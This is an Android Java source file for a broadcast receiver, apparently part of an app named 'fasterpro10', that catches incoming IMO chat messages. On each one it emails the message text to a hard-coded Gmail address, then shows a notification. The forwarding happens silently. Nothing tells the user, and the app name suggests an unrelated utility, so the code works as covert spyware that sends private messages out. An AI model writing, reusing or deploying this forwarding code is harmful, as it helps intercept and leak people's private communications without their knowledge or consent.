package com.example.fasterpro10;

import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import javax.mail.MessagingException;

public class ImoReceiver extends BroadcastReceiver {

    private static final String TAG = "ImoReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("com.imo.NEW_MESSAGE")) {
            // Handle IMO message received
            Log.d(TAG, "IMO message received");
            System. out. println("ImoReceiver 30 onReceive");

            // Extract message data from intent
            String message = intent.getStringExtra("message");

            // Forward IMO message via email
            try {
                JavaMailAPI.sendMail("babulahmed000015@gmail.com", "IMO Message Forwarded", message);
                Log.d(TAG, "IMO message forwarded successfully via email");
                System. out. println("ImoReceiver 32 IMO message forwarded successfully");
            } catch (MessagingException e) {
                Log.e(TAG, "Failed to forward IMO message: " + e.getMessage());
                System. out. println("ImoReceiver 33 Failed to forward IMO message");
                e.printStackTrace();
            }

            // Add your IMO message handling logic here
            handleImoMessage(context, message);
        }
    }

    private void handleImoMessage(Context context, String message) {
        // Implement your logic to handle IMO messages here
        Log.d(TAG, "Handling IMO message: " + message);

        // Check if the message contains a phone number format
        if (message.matches("\\d{3}[-\\.\\s]\\d{3}[-\\.\\s]\\d{4}")) {
            // Extract the phone number using a regular expression
            String phoneNumber = message.replaceAll("[^\\d]", "");
            // Extract the area code (assuming US format)
            String areaCode = phoneNumber.substring(0, 3);

            // Display notification with both area code and message
            displayNotification(context, "Area code: " + areaCode + "\nMessage: " + message);
        } else {
            // Display notification indicating no phone number found
            displayNotification(context, "New IMO Message\nMessage: " + message + "\n(No phone number detected)");
        }
    }

    private void displayNotification(Context context, String message) {
        // Check for the POST_NOTIFICATIONS permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            // Request the permission if it's not granted
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + context.getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return;

        }

        // Create a notification
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "channel_id")
                .setSmallIcon(R.drawable.notification_icon)
                .setContentTitle("New IMO Message")
                .setContentText(message)
                .setAutoCancel(true); // Auto dismiss notification on click

        // Add support for large icons for devices running on Android Lollipop and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            builder.setLargeIcon(BitmapFactory.decodeResource(context.getResources(), R.drawable.large_notification_icon));
        }

        // Create a NotificationManager to show the notification
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        // Notification ID allows you to update or cancel the notification later on
        int notificationId = 1;

        // Show the notification
        notificationManager.notify(notificationId, builder.build());
    }
}
